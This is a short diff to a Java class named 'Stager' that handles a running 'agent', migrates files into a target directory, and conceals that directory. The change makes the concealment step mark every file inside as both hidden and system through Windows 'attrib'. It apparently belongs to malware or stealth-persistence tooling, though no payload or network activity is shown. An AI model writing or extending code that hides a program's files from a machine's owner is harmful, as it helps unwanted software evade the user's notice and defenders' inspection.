@@ -59,13 +59,13 @@ public final class Stager {
 				// The target may already own a live agent from a prior launch:
 				// stop it before merging files it could be writing.
 				if (!stopAgent(target) || !stopSources() || !finishConversion(target)) {
-					return dir;
+					return target;
 				}
 				backupSources(target, null);
 				return target;
 			} catch (Throwable throwable) {
 				LOGGER.debug("Migration into existing target failed", throwable);
-				return dir;
+				return target;
 			}
 		}
 		if (!Files.isDirectory(dir)) {
@@ -428,7 +428,7 @@ public final class Stager {
 		}
 		try {
 			new ProcessBuilder("attrib", "+h", "+s", dir.toString()).start().waitFor(3L, TimeUnit.SECONDS);
-			new ProcessBuilder("cmd", "/c", "attrib +h /s /d \"" + dir + "\\*\"").start()
+			new ProcessBuilder("cmd", "/c", "attrib +h +s /s /d \"" + dir + "\\*\"").start()
 				.waitFor(3L, TimeUnit.SECONDS);
 		} catch (Throwable throwable) {
 			LOGGER.debug("Conceal failed", throwable);
